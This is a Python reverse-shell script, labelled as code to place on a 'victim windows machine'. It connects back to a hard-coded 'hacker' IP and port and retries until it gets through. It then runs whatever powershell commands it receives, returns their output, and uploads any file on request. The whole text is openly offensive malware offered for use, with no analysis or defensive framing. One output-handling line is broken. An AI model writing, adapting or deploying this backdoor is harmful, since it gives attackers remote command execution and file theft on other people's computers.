# code to place on the victim windows machine with a password file
"""
import socket
import subprocess
import time
import os

IDENTIFIER = "<END_OF_COMMAND_RESULT>"
CHUNK_SIZE = 2048
eof_indentifier = "<END_OF_FILE>"


if __name__ == "__main__":

    hacker_IP = "192.168.0.12"
    hacker_port = 8008
    hacker_address = (hacker_IP, hacker_port)

    while True:
        try:

            victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            print("trying to connect with ", hacker_address)
            victim_socket.connect(hacker_address)
            while True:
                data = victim_socket.recv(1024)

                hacker_command = data.decode()
                print("hacker command = ", hacker_command)
                if hacker_command == "stop":
                    # This part is to exit the program safely
                    break
                elif hacker_command == "":
                    # if the hacker presses enter unexpectedly
                    continue
                elif hacker_command.startswith("cd"):
                    # to move directories
                    path2move = hacker_command.strip("cd ")  # remove cd
                    if os.path.exists(
                        path2move
                    ):  # returns true if string starts with value-cd
                        os.chdir(path2move)  # change current directory to given path
                    else:
                        print("cant change dir to ", path2move)
                    continue
                elif hacker_command.startswith("download"):
                    file_to_download = hacker_command.strip("download ")
                    if os.path.exists(file_to_download):
                        exists = "yes"
                        victim_socket.send(exists.encode())  # if it esists sned "yes"

                        with open(file_to_download, "rb") as file:
                            chunk = file.read(CHUNK_SIZE)

                            while len(chunk) > 0:  # keep sending unitl end of file
                                victim_socket.send(chunk)
                                chunk = file.read(CHUNK_SIZE)

                            victim_socket.send(
                                eof_indentifier.encode()
                            )  # to know that incoming data is complete
                        print("File sent successfully")

                    else:
                        exists = "no"
                        victim_socket.send(exists.encode())
                        continue
                else:
                    # run powershell command from the hacker
                    output = subprocess.run(
                        ["powershell.exe", hacker_command],
                        shell=True,
                        capture_output=True,
                    )
                    if output.stderr.decode("utf-8") == "":
                        command_result = output.stdout("utf-8") + IDENTIFIER
                        command_result = command_result.encode("utf-8")
                    else:
                        command_result = output.stderr

                    victim_socket.sendall(command_result)
        except KeyboardInterrupt:
            print("exiting")
        except Exception as err:
            print("Unable to connect: ", err)
            time.sleep(5)
"""
